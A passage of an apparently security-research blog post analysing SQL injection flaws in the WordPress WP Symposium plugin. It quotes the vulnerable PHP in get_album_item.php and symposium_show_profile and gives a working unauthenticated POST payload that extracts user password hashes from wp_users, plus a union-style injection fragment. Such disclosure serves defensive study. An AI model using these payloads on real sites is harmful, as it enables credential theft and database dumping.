class="crayon-cn">2</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">3</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">4</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">5</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">6</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">7</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">8</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">9</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">display_name</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">11</span><span class="crayon-h"> </span><span class="crayon-e">FROM </span><span class="crayon-e">wp_users </span><span class="crayon-i">WHERE</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-cn">1</span><span class="crayon-o">=</span><span class="crayon-cn">1</span></div></div></td>
+					</tr>
+				</table>
+			</div>
+		</div>
+<!-- [Format Time: 0.0065 seconds] -->
+<p><strong>Analysis of get_album_item.php SQL injection vulnerability</strong></p>
+<p>This SQL injection vulnerability is practically as simple as it gets. And it even makes it simple for us in <a href="http://plugins.svn.wordpress.org/wp-symposium/tags/12.09/get_album_item.php">get_album_item.php</a>.</p><!-- Crayon Syntax Highlighter v2.5.0 -->
+
+		<div id="crayon-53c98785efec5336913352" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
+		
+			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
+			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-mixed-highlight" title="Contains Mixed Languages"></span><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div><span class="crayon-language">PHP</span></div></div>
+			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
+			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
+&lt;?php
+	include_once('../../../wp-config.php');
+	global $wpdb;
+	$iid = $_REQUEST['iid'];
+	$size = $_REQUEST['size'];
+	$sql = "SELECT ".$size." FROM ".$wpdb-&gt;base_prefix."symposium_gallery_items WHERE iid = %d";
+	$image = $wpdb-&gt;get_var($wpdb-&gt;prepare($sql, $iid));	
+	header("Content-type: image/jpeg");
+	echo stripslashes($image);
+?&gt;</textarea></div>
+			<div class="crayon-main" style="">
+				<table class="crayon-table">
+					<tr class="crayon-row">
+				<td class="crayon-nums " data-settings="show">
+					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c98785efec5336913352-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98785efec5336913352-2">2</div><div class="crayon-num" data-line="crayon-53c98785efec5336913352-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98785efec5336913352-4">4</div><div class="crayon-num" data-line="crayon-53c98785efec5336913352-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98785efec5336913352-6">6</div><div class="crayon-num" data-line="crayon-53c98785efec5336913352-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98785efec5336913352-8">8</div><div class="crayon-num" data-line="crayon-53c98785efec5336913352-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98785efec5336913352-10">10</div></div>
+				</td>
+						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c98785efec5336913352-1"><span class="crayon-ta">&lt;?php</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98785efec5336913352-2"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-k ">include_once</span><span class="crayon-sy">(</span><span class="crayon-s">'../../../wp-config.php'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98785efec5336913352-3"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">global</span><span class="crayon-h"> </span><span class="crayon-v">$wpdb</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98785efec5336913352-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$iid</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">$_REQUEST</span><span class="crayon-sy">[</span><span class="crayon-s">'iid'</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98785efec5336913352-5"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$size</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">$_REQUEST</span><span class="crayon-sy">[</span><span class="crayon-s">'size'</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98785efec5336913352-6"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$sql</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"SELECT "</span><span class="crayon-sy">.</span><span class="crayon-v">$size</span><span class="crayon-sy">.</span><span class="crayon-s">" FROM "</span><span class="crayon-sy">.</span><span class="crayon-v">$wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-i">base_prefix</span><span class="crayon-sy">.</span><span class="crayon-s">"symposium_gallery_items WHERE iid = %d"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98785efec5336913352-7"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$image</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">$wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">get_var</span><span class="crayon-sy">(</span><span class="crayon-v">$wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">prepare</span><span class="crayon-sy">(</span><span class="crayon-v">$sql</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">$iid</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98785efec5336913352-8"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">header</span><span class="crayon-sy">(</span><span class="crayon-s">"Content-type: image/jpeg"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98785efec5336913352-9"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-k ">echo</span><span class="crayon-h"> </span><span class="crayon-e">stripslashes</span><span class="crayon-sy">(</span><span class="crayon-v">$image</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98785efec5336913352-10"><span class="crayon-ta">?&gt;</span></div></div></td>
+					</tr>
+				</table>
+			</div>
+		</div>
+<!-- [Format Time: 0.0041 seconds] -->
+<p>It reads in 2 variables from $_REQUEST, which can be either GET or POST parameters. That&#8217;s very handy. It then proceeds to stuff the size into the SELECT part of the query using plain concatenation without previous sanitization, and then uses the wordpress prepare method of passing in content to a query safely using a printf syntax, which is safe.</p>
+<p>Because we have control over the SELECT part of the query, we can easily select out a single piece of data at a time, which is sufficient to dump the whole database as needed. Here we can pull out a password from the users table, for instance, using a very simple request, no authentication required:</p><!-- Crayon Syntax Highlighter v2.5.0 -->
+
+		<div id="crayon-53c98785efed5942076940" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
+		
+			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
+			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
+			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
+			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
+POST /wordpress/wp-content/plugins/wp-symposium/get_album_item.php HTTP/1.0
+Host: 192.168.80.130
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 30
+
+size=user_pass FROM wp_users #</textarea></div>
+			<div class="crayon-main" style="">
+				<table class="crayon-table">
+					<tr class="crayon-row">
+				<td class="crayon-nums " data-settings="show">
+					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c98785efed5942076940-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98785efed5942076940-2">2</div><div class="crayon-num" data-line="crayon-53c98785efed5942076940-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98785efed5942076940-4">4</div><div class="crayon-num" data-line="crayon-53c98785efed5942076940-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98785efed5942076940-6">6</div></div>
+				</td>
+						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c98785efed5942076940-1"><span class="crayon-i">POST</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">wordpress</span><span class="crayon-o">/</span><span class="crayon-i">wp</span><span class="crayon-o">-</span><span class="crayon-i">content</span><span class="crayon-o">/</span><span class="crayon-i">plugins</span><span class="crayon-o">/</span><span class="crayon-i">wp</span><span class="crayon-o">-</span><span class="crayon-i">symposium</span><span class="crayon-o">/</span><span class="crayon-v">get_album_item</span><span class="crayon-sy">.</span><span class="crayon-e">php </span><span class="crayon-i">HTTP</span><span class="crayon-o">/</span><span class="crayon-cn">1.0</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98785efed5942076940-2"><span class="crayon-i">Host</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">192.168.80.130</span></div><div class="crayon-line" id="crayon-53c98785efed5942076940-3"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Type</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">application</span><span class="crayon-o">/</span><span class="crayon-i">x</span><span class="crayon-o">-</span><span class="crayon-i">www</span><span class="crayon-o">-</span><span class="crayon-i">form</span><span class="crayon-o">-</span><span class="crayon-e">urlencoded</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98785efed5942076940-4"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Length</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">30</span></div><div class="crayon-line" id="crayon-53c98785efed5942076940-5">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c98785efed5942076940-6"><span class="crayon-v">size</span><span class="crayon-o">=</span><span class="crayon-e">user_pass </span><span class="crayon-e">FROM </span><span class="crayon-i">wp_users</span><span class="crayon-h"> </span><span class="crayon-p">#</span></div></div></td>
+					</tr>
+				</table>
+			</div>
+		</div>
+<!-- [Format Time: 0.0022 seconds] -->
+<p><strong>Analysis of symposium_show_profile SQL injection vulnerability</strong></p>
+<p>This vulnerability relies on the way which profiles are shown in Symposium. It calls into the symposium_show_profile method in symposium_profile.php file, which finds out what ID to show information for like this, assuming you are authenticated:</p><!-- Crayon Syntax Highlighter v2.5.0 -->
+
+		<div id="crayon-53c98785efee4318054926" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
+		
+			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
+			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
+			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
+			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
+// Adds profile page
+function symposium_show_profile($page)  
+{  
+
+	global $wpdb, $current_user;
+
+	$uid = '';
+
+	if (isset($_POST['from']) &amp;amp;&amp;amp; $_POST['from'] == 'small_search') {
+		if ($_POST['uid'] == '') {
+			$search = $_POST['member_small'];
+			$uid = $wpdb-&amp;gt;get_var("SELECT u.ID FROM ".$wpdb-&amp;gt;base_prefix."users u WHERE u.display_name LIKE '".$search."%'");
+		}
+	} 
+	if ($uid == '') {
+
+		if (isset($_GET['uid'])) {
+			$uid = $_GET['uid'];
+		} else {
+			if (isset($_POST['uid'])) {
+				$uid = $_POST['uid'];
+			} else {
+				$uid = $current_user-&amp;gt;ID;
+			}
+		}
+
+	}
+
+	// resolve stubs if using WPS permalinks
+	if ( get_option('symposium_permalink_structure') &amp;amp;&amp;amp; get_query_var('stub')) {
+		$stubs = explode('/', get_query_var('stub'));
+		$stub0 = $stubs[0];
+		if (WPS_DEBUG) echo $stub0.'&amp;lt;br /&amp;gt;';
+
+		if ($stub0) {
+			$sql = "SELECT ID FROM ".$wpdb-&amp;gt;base_prefix."users WHERE replace(display_name, ' ', '') = %s";
+			$id = $wpdb-&amp;gt;get_var($wpdb-&amp;gt;prepare($sql, $stub0));
+			if (WPS_DEBUG) echo $wpdb-&amp;gt;last_query.'&amp;lt;br /&amp;gt;';
+			if ($id) {
+				$uid = $id;
+			}
+		}
+	}
+
+	$share = get_symposium_meta($uid, 'share');
+	if (WPS_DEBUG) echo 'UID:'.$uid.'&amp;lt;br /&amp;gt;';
+	$html = '&amp;lt;div id="symposium_current_user_page" style="display:none"&amp;gt;'.$uid.'&amp;lt;/div&amp;gt;';
+
+	if (is_user_logged_in() || $share == 'public') {		
+
+		$user = $wpdb-&amp;gt;get_row("SELECT display_name FROM ".$wpdb-&amp;gt;base_prefix."users WHERE ID = ".$uid);</textarea></div>
+			<div class="crayon-main" style="">
+				<table class="crayon-table">
+					<tr class="crayon-row">
+				<td class="crayon-nums " data-settings="show">
+					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c98785efee4318054926-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98785efee4318054926-2">2</div><div class="crayon-num" data-line="crayon-53c98785efee4318054926-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98785efee4318054926-4">4</div><div class="crayon-num" data-line="crayon-53c98785efee4318054926-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98785efee4318054926-6">6</div><div class="crayon-num" data-line="crayon-53c98785efee4318054926-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98785efee4318054926-8">8</div><div class="crayon-num" data-line="crayon-53c98785efee4318054926-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98785efee4318054926-10">10</div><div class="crayon-num" data-line="crayon-53c98785efee4318054926-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98785efee4318054926-12">12</div><div class="crayon-num" data-line="crayon-53c98785efee4318054926-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98785efee4318054926-14">14</div><div class="crayon-num" data-line="crayon-53c98785efee4318054926-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98785efee4318054926-16">16</div><div class="crayon-num" data-line="crayon-53c98785efee4318054926-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98785efee4318054926-18">18</div><div class="crayon-num" data-line="crayon-53c98785efee4318054926-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98785efee4318054926-20">20</div><div class="crayon-num" data-line="crayon-53c98785efee4318054926-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98785efee4318054926-22">22</div><div class="crayon-num" data-line="crayon-53c98785efee4318054926-23">23</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98785efee4318054926-24">24</div><div class="crayon-num" data-line="crayon-53c98785efee4318054926-25">25</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98785efee4318054926-26">26</div><div class="crayon-num" data-line="crayon-53c98785efee4318054926-27">27</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98785efee4318054926-28">28</div><div class="crayon-num" data-line="crayon-53c98785efee4318054926-29">29</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98785efee4318054926-30">30</div><div class="crayon-num" data-line="crayon-53c98785efee4318054926-31">31</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98785efee4318054926-32">32</div><div class="crayon-num" data-line="crayon-53c98785efee4318054926-33">33</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98785efee4318054926-34">34</div><div class="crayon-num" data-line="crayon-53c98785efee4318054926-35">35</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98785efee4318054926-36">36</div><div class="crayon-num" data-line="crayon-53c98785efee4318054926-37">37</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98785efee4318054926-38">38</div><div class="crayon-num" data-line="crayon-53c98785efee4318054926-39">39</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98785efee4318054926-40">40</div><div class="crayon-num" data-line="crayon-53c98785efee4318054926-41">41</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98785efee4318054926-42">42</div><div class="crayon-num" data-line="crayon-53c98785efee4318054926-43">43</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98785efee4318054926-44">44</div><div class="crayon-num" data-line="crayon-53c98785efee4318054926-45">45</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98785efee4318054926-46">46</div><div class="crayon-num" data-line="crayon-53c98785efee4318054926-47">47</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98785efee4318054926-48">48</div><div class="crayon-num" data-line="crayon-53c98785efee4318054926-49">49</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98785efee4318054926-50">50</div><div class="crayon-num" data-line="crayon-53c98785efee4318054926-51">51</div></div>
+				</td>
+						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c98785efee4318054926-1"><span class="crayon-c">// Adds profile page</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98785efee4318054926-2"><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-e">symposium_show_profile</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">page</span><span class="crayon-sy">)</span><span class="crayon-h">&nbsp;&nbsp;</span></div><div class="crayon-line" id="crayon-53c98785efee4318054926-3"><span class="crayon-sy">{</span><span class="crayon-h">&nbsp;&nbsp;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98785efee4318054926-4">&nbsp;</div><div class="crayon-line" id="crayon-53c98785efee4318054926-5"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">global</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">current_user</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98785efee4318054926-6">&nbsp;</div><div class="crayon-line" id="crayon-53c98785efee4318054926-7"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">uid</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">''</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98785efee4318054926-8">&nbsp;</div><div class="crayon-line" id="crayon-53c98785efee4318054926-9"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">isset</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'from'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-i">amp</span><span class="crayon-sy">;</span><span class="crayon-o">&amp;</span><span class="crayon-i">amp</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'from'</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-s">'small_search'</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98785efee4318054926-10"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'uid'</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-s">''</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c98785efee4318054926-11"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">search</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'member_small'</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98785efee4318054926-12"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">uid</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-</span><span class="crayon-o">&amp;</span><span class="crayon-i">gt</span><span class="crayon-sy">;</span><span class="crayon-e">get_var</span><span class="crayon-sy">(</span><span class="crayon-s">"SELECT u.ID FROM "</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-</span><span class="crayon-o">&amp;</span><span class="crayon-i">gt</span><span class="crayon-sy">;</span><span class="crayon-v">base_prefix</span><span class="crayon-sy">.</span><span class="crayon-s">"users u WHERE u.display_name LIKE '"</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-v">search</span><span class="crayon-sy">.</span><span class="crayon-s">"%'"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98785efee4318054926-13"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98785efee4318054926-14"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-53c98785efee4318054926-15"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">uid</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-s">''</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98785efee4318054926-16">&nbsp;</div><div class="crayon-line" id="crayon-53c98785efee4318054926-17"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">isset</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_GET</span><span class="crayon-sy">[</span><span class="crayon-s">'uid'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98785efee4318054926-18"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">uid</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">_GET</span><span class="crayon-sy">[</span><span class="crayon-s">'uid'</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98785efee4318054926-19"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span><span class="crayon-h"> </span><span class="crayon-st">else</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98785efee4318054926-20"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">isset</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'uid'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c98785efee4318054926-21"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">uid</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'uid'</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98785efee4318054926-22"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span><span class="crayon-h"> </span><span class="crayon-st">else</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c98785efee4318054926-23"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span 